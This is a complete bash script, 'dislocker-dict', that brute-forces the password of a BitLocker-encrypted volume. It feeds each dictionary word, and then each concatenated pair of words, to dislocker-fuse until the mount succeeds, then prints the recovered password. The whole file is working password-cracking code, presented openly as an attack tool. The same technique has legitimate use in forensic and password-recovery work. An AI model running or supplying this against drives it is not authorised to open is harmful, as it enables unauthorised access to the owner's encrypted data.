#!/bin/bash
#
#   dislocker-dict
#   (C) 2017 Wrecked Security
#
#   Very ineffiecient way of using dictionary attack against BitLocker
#
#   Be nice and behave
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software Foundation,
#   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
#

# Some Helpers

echo_header()
{
        LB='\033[1;34m'
        NC='\033[0m' # No Color
        printf "${LB}$*${NC}\n"

}

echo_item()
{
	LB='\033[1;35m'
        NC='\033[0m' # No Color
        printf "${LB}$*${NC}\t"

}

echo_success()
{
	GREEN='\033[1;32m'
	NC='\033[0m' # No Color
	printf "${GREEN}$*${NC}\n"
}

echo_failure()
{
        RED='\033[0;31m'
        NC='\033[0m' # No Color
	printf "${RED}$*${NC}\n"
}

hack()
{
	echo_item $*
        if dislocker-fuse -V $VOLUME --user-password=$* $MOUNT 1> /dev/null; then
                echo_success " FOUND!"
                echo "Partition decryption password is: $*"
		umount $MOUNT
                exit 0
        else
                echo_failure " NOT FOUND"
        fi
}
# Print out title header
echo_header "dislocker-dict v. 0.1 - Very inefficient way of using dictionary attack against BitLocker"
echo_header "(C) 2017 Wrecked Security"


# Parse parameters
while [[ $# -gt 1 ]]
do
key="$1" # Grab first parameter

case $key in
	-v|--volume)	# Volume to decrypt
	VOLUME="$2"	# Assign cmd arg to variable
	shift		# Shift cmd argument
	;;
	-m|--mount)	# Mount point
	MOUNT="$2"
	shift
	;;
	-d|--dictionary) # Dictionary to use
	DICTIONARY="$2" # Assign var
	shift
	;;
esac
shift
done
# Validate input
if ! [ -x "$(command -v dislocker-fuse)" ]; then
	echo 'Error: dislocker-fuse not found. Please make sure it is installed.' >&2
	exit 1
fi
if [ -z ${VOLUME+x} ]; then
	echo 'Error: Volume is not set. Please use -v|--volume to set encrypted volume.' >&2
	exit 1
fi
if [ -z ${MOUNT+x} ]; then
	echo 'Error: Mount point is not set. Please use -m|--mount to set mount point.' >&2
	exit 1
fi
if [ -z ${DICTIONARY+x} ]; then
	echo 'Error: Dictionary is not set. Please us -d|--dictionary to set dictionary.' >&2
	exit 1
fi
# Run PASS 1 (Test each of the lines in dictionary against BitLocker drive)
echo_header 'Running PASS 1'
while IFS='' read -r line || [[ -n "$line" ]]; do
	hack $line
done < $DICTIONARY

# Run Pass 2 (Test dictionary combinations against BitLocker drive)
echo_header 'Running PASS 2'
while IFS='' read -r line1 || [[ -n "$line1" ]]; do
	while IFS='' read -r line2 || [[ -n "$line2" ]]; do
	W="$line1$line2"
	hack $W
	done < $DICTIONARY
done < $DICTIONARY


